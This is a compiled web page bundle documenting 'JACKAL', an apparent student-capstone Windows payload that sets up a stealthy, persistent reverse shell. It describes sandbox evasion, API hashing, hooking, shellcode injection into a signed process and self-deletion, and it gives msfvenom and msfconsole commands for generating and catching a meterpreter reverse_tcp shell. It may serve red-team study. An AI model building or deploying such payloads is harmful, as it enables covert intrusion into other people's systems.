import{_ as e,c as t,o as a,a2 as s}from"./chunks/framework.B0RokHVs.js";const m=JSON.parse('{"title":"Windows Payload: JACKAL","description":"","frontmatter":{},"headers":[],"relativePath":"Sample Payloads/windows.md","filePath":"Sample Payloads/windows.md"}'),n={name:"Sample Payloads/windows.md"},o=s(`<h1 id="windows-payload-jackal" tabindex="-1">Windows Payload: JACKAL <a class="header-anchor" href="#windows-payload-jackal" aria-label="Permalink to &quot;Windows Payload: JACKAL&quot;">​</a></h1><h3 id="source-code" tabindex="-1">Source Code <a class="header-anchor" href="#source-code" aria-label="Permalink to &quot;Source Code&quot;">​</a></h3><ul><li><a href="https://github.com/Nekrosis-ISS-Capstone/JACKAL" target="_blank" rel="noreferrer">https://github.com/Nekrosis-ISS-Capstone/JACKAL</a></li></ul><h3 id="description" tabindex="-1">Description <a class="header-anchor" href="#description" aria-label="Permalink to &quot;Description&quot;">​</a></h3><p>This documentation outlines the functionality and implementation details of &quot;JACKAL&quot;, a Windows payload designed to establish a persistent reverse shell on a target system. The payload is designed to work in conjunction with the nekrosis framework, leveraging advanced techniques for stealth and evasion.</p><h3 id="functionality-overview" tabindex="-1">Functionality overview <a class="header-anchor" href="#functionality-overview" aria-label="Permalink to &quot;Functionality overview&quot;">​</a></h3><ol><li><strong>Debugging and Sandbox Detection</strong>: The payload conducts an initial check to determine if it&#39;s being debugged or running within a sandbox environment. This is crucial for evading detection and ensuring successful execution.</li><li><strong>Import Address Table Camouflage</strong>: To avoid detection, the payload disguises its import address table with whitelisted API functions. This helps to blend in with legitimate system processes and avoid triggering security mechanisms.</li><li><strong>Dynamic API Resolution</strong>: The payload dynamically resolves API functions using the custom GetProcessAddressByHash() function. This function utilizes a compile time djb2 hashing algorithm to calculate function hashes, which are then matched against the export address table of specified DLLs to locate the required functions.</li><li><strong>Delayed Execution</strong>: The payload introduces delayed execution to wait for a target binary to spawn. This ensures that the payload seamlessly integrates with the target process, enhancing stealth and persistence.</li><li><strong>Hook installation and shellcode execution</strong>: Once the target process is running, the payload locates the address of the WinAPI function to hook within the target process. It then patches the trampoline hook shellcode with the address of the function to hook. Following this, the payload identifies a memory hole adjacent to the DLL exporting the target WinAPI function. The decrypted msfvenom shellcode is injected into this buffer. When the hooked WinAPI function is called in the target process, the injected shellcode is executed. Subsequently, the execution of the target process resumes, establishing a reverse shell connection through the signed binary targeted by the payload.</li><li><strong>Self-Deletion</strong>: After successfully establishing the reverse shell, the payload deletes itself to remove evidence of its presence on the system. This helps to maintain stealth and avoid detection by security tools.</li></ol><h3 id="preparation-and-compilation" tabindex="-1">Preparation and Compilation <a class="header-anchor" href="#preparation-and-compilation" aria-label="Permalink to &quot;Preparation and Compilation&quot;">​</a></h3><p>To ensure a connection can be established to your machine for the reverse shell, a generated payload has to be inserted in the payload array located in payload.cpp. A payload can be generated using msfvenom:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={listener IP} LPORT={listener port} -f c</span></span></code></pre></div><p>After the payload is generated and inserted into the code, the code can be compiled using visual studio, and msfconsole can be used as a listener with the following commands</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>msfconsole</span></span>
<span class="line"><span>msf6 &gt; use windows/x64/meterpreter/reverse_tcp</span></span>
<span class="line"><span>msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; set LHOST {listener ip}</span></span>
<span class="line"><span>msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; set LPORT {listener port}</span></span>
<span class="line"><span>msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; exploit</span></span></code></pre></div>`,12),i=[o];function r(l,d,c,h,p,u){return a(),t("div",null,i)}const f=e(n,[["render",r]]);export{m as __pageData,f as default};